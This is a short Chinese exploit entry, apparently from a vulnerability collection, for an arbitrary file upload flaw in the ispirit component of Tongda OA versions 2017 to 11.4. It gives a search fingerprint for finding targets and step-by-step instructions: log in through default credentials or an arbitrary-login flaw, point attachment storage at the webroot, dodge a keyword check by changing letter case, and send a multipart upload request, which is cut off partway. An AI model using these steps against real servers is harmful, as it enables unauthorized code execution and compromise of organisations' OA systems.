# 通达OAispirit存在后台任意文件上传漏洞

- **系统**：通达OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`POST /ispirit/im/upload.php HTTP/1.1`
- **关键头**：`Host: 192.168.31.164`　`Content-Length: 639`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB…`

**请求体 / payload**
```
1、使用默认密码admin，密码为空或采用通达OA任意用户登录登录后台；\

2、点击系统管理->系统参数设置->OA服务设置，找到网站根目录：D:\MYOA\webroot；\

3、点击系统管理->附件管理->添加存储目录，设置附件上传目录为网站根目录：\
存储目录设置为Webroot目录，标识id为100-255的整数，勾选将所有新附件存至该目录，描述随意：\
⚠️注意：在11.2以上版本会检测存储目录是否包含webroot关键词检测，所以采用大小写绕过：D:\MYOA\webrooT；\

4、 上传文件\
其中`P`为登陆后的cookie中的`PHPSESSID`字段\
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="UPLOAD_MODE"
1
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="P"
l2h5pe5n9hmhrmqi2nj89lae50
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="DEST_UID"
1
------W…（脚本共 984 字，完整版见原文）
```

**其他**
- 通达OA ispirit存在后台任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA 2017-通达OA V 11.4